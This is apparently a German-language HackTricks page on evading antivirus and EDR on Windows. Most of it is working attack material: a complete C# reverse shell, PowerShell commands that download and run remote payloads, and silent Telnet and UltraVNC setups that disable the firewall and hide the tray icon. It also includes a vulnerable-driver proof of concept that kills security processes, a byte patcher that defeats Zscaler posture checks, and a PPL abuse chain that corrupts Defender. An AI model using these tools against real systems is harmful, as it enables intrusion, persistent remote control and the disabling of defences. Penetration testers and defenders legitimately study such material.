Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die Funktion `EtwEventWrite` des User-Space-Prozesses so zu patchen, dass sie sofort zurückkehrt, ohne irgendwelche Ereignisse zu protokollieren. Dadurch wird das ETW-Logging für diesen Prozess effektiv deaktiviert.

Mehr Informationen finden Sie in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist seit einiger Zeit bekannt und ist weiterhin eine sehr gute Methode, um Ihre Post-Exploitation-Tools auszuführen, ohne vom AV entdeckt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Ansätze dafür:

- **Fork\&Run**

Dabei wird ein **neuer "opfer"-Prozess erzeugt**, in den Ihr post-exploitation bösartiger Code injiziert wird. Sie führen den Code in diesem neuen Prozess aus und beenden ihn nach Abschluss. Das hat Vor- und Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantats stattfindet. Das bedeutet, wenn etwas bei unserer Post-Exploitation-Aktion schiefgeht oder entdeckt wird, besteht eine **viel größere Chance**, dass unser **Implant überlebt**. Der Nachteil ist, dass Sie eine **höhere Wahrscheinlichkeit** haben, durch **Behavioural Detections** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hierbei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. Dadurch können Sie vermeiden, einen neuen Prozess zu erstellen, der von AV gescannt wird. Der Nachteil ist jedoch, dass, wenn bei der Ausführung Ihres Payloads etwas schiefgeht, die **Wahrscheinlichkeit, dass Ihr Beacon verloren geht**, deutlich höher ist, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn Sie mehr über das Laden von C#-Assemblies lesen möchten, sehen Sie sich diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Sie können C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem der kompromittierten Maschine Zugriff **auf die auf dem vom Angreifer kontrollierten SMB-Share installierte Interpreter-Umgebung** gegeben wird.

Durch den Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share können Sie **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo weist darauf hin: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP etc. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer erlaubt, mit dem Access-Token oder einem Sicherheitsprodukt wie einem EDR oder AV zu manipulieren, sodass dessen Rechte reduziert werden — der Prozess stirbt nicht, hat aber nicht mehr die Berechtigungen, um nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **verhindern, dass externe Prozesse Handles auf die Tokens von Sicherheitsprozessen** erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Verwendung vertrauenswürdiger Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC zu installieren und es dann zu verwenden, um diesen zu übernehmen und Persistenz zu gewährleisten:
1. Laden Sie von https://remotedesktop.google.com/ herunter, klicken Sie auf "Set up via SSH" und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führen Sie den Installer silent auf dem Opfer aus (Administrator erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehen Sie zurück zur Chrome Remote Desktop-Seite und klicken Sie auf Weiter. Der Assistent fordert Sie dann zur Authorisierung auf; klicken Sie zur Fortsetzung auf die Authorize-Schaltfläche.
4. Führen Sie den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachten Sie den pin-Parameter, mit dem die PIN ohne Verwendung der GUI gesetzt werden kann).


## Erweiterte Evasion

Evasion ist ein sehr komplexes Thema; manchmal muss man viele verschiedene Telemetriequellen in einem einzigen System berücksichtigen, sodass es nahezu unmöglich ist, in reifen Umgebungen komplett unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, sich diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in der Tiefe.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Überprüfen, welche Teile Defender als bösartig erkennt**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig identifiziert, und es für Sie aufschlüsselt.\
Ein weiteres Tool, das **das Gleiche tut, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Web-Service unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 wurde allen Windows-Versionen ein **Telnet-Server** mitgeliefert, den Sie (als Administrator) installieren konnten, indem Sie:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es beim Systemstart **starten** und **jetzt ausführen**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du möchtest die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die neu erstellte Datei _**UltraVNC.ini**_ in den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es bereit ist, eine reverse **VNC connection** zu empfangen. Dann, auf dem **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unauffällig zu bleiben, darfst du folgende Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird sich [the config window](https://i.imgur.com/rfMQWcf.png) öffnen
- Führe `winvnc -h` nicht aus, um Hilfe zu erhalten, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Im Inneren von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte jetzt **den lister** mit `msfconsole -r file.rc` und **führe** die **xml payload** mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C#-Obfuskatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Verwendung von python für build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernelbereich abschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutz zu deaktivieren, bevor Ransomware installiert wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte abgelegte Datei heißt `ServiceMouse.sys`, der Binärinhalt ist jedoch der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **kernel service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber exponierte IOCTLs**
| IOCTL code | Funktion                              |
|-----------:|---------------------------------------|
| `0x99000050` | Einen beliebigen Prozess per PID beenden (wird genutzt, um Defender/EDR-Dienste zu killen) |
| `0x990000D0` | Beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimaler C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann *protected* Prozesse öffnen, sie beenden oder mit Kernel-Objekten manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmechanismen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Vulnerable-Driver-Blockliste (`HVCI`, `Smart App Control`), sodass Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie das Erstellen neuer *kernel* services und alarmieren Sie, wenn ein Treiber aus einem für alle schreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung der Posture-Checks des Zscaler Client Connector durch Patchen signierter Binaries auf der Festplatte

Zscalers **Client Connector** führt device-posture-Regeln lokal aus und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen machen eine vollständige Umgehung möglich:

1. Die Posture-Evaluierung findet **vollständig clientseitig** statt (ein boolescher Wert wird an den Server gesendet).  
2. Interne RPC-Endpunkte validieren nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Nicht signierte oder modifizierte Binärdateien können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Policies definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches ausgehebelt werden können.

## Missbrauch von Protected Process Light (PPL) zur Manipulation von AV/EDR mit LOLBINs

Protected Process Light (PPL) erzwingt eine Signierer-/Level-Hierarchie, sodass nur gleich- oder höherstufige geschützte Prozesse einander manipulieren können. Angriffstechnisch gilt: Wenn man legitim ein PPL-aktiviertes Binary starten und dessen Argumente kontrollieren kann, lässt sich harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL unterstütztes Schreib-Primitive gegen geschützte Verzeichnisse wandeln, die von AV/EDR verwendet werden.

Was dafür sorgt, dass ein Prozess als PPL läuft
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden und die Flags verwenden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Es muss ein kompatibles Protection-Level angefordert werden, das zum Signierer des Binaries passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen beim Erstellen zum Fehlschlag.

Siehe auch eine weitergehende Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Helfer: CreateProcessAsPPL (wählt das Schutzlevel und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsbeispiel:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Orte zu verweisen.

8.3 Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte den PPL-fähigen LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergebe das ClipUp-Log-Pfad-Argument, um die Erstellung einer Datei in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Falls nötig, verwende 8.3-Kurznamen.
3) Wenn die Ziel-Binärdatei während des Betriebs normalerweise vom AV offen/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten, bevor der AV startet, indem du einen Auto-Start-Service installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Reboot erfolgt der PPL-geschützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen redigiert/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, nur hinsichtlich des Ablageorts kontrollieren; die Primitive eignet sich eher zur Korruption als zur präzisen Content-Injektion.
- Erfordert lokalen Admin/SYSTEM, um einen Service zu installieren/zu starten, sowie ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Bootzeit vermeidet Dateisperren.

Erkennungen
- Prozess-Erstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, besonders wenn der Parent-Prozess ein nicht-standardmäßiger Launcher ist, während des Bootvorgangs.
- Neue Services, die so konfiguriert sind, dass verdächtige Binaries automatisch gestartet werden und konsequent vor Defender/AV starten. Untersuchen Sie die Erstellung/Änderung von Services vor Defender-Startfehlern.
- Dateiintegritätsüberwachung für Defender-Binaries/Platform-Verzeichnisse; unerwartete Datei-Erstellungen/Änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: Achten Sie auf Prozesse, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und auf anomalen PPL-Level-Gebrauch durch non-AV-Binaries.

Gegenmaßnahmen
- WDAC/Code Integrity: Beschränken Sie, welche signierten Binaries als PPL laufen dürfen und unter welchen Parent-Prozessen; blockieren Sie den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Service-Hygiene: Beschränken Sie die Erstellung/Änderung von Auto-Start-Services und überwachen Sie Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender-Tamper-Schutz und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf eine Binary-Korruption hindeuten.
- Erwägen Sie, die 8.3-Short-Name-Generierung auf Volumes, die Security-Tools hosten, zu deaktivieren, sofern das mit Ihrer Umgebung kompatibel ist (gründlich testen).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
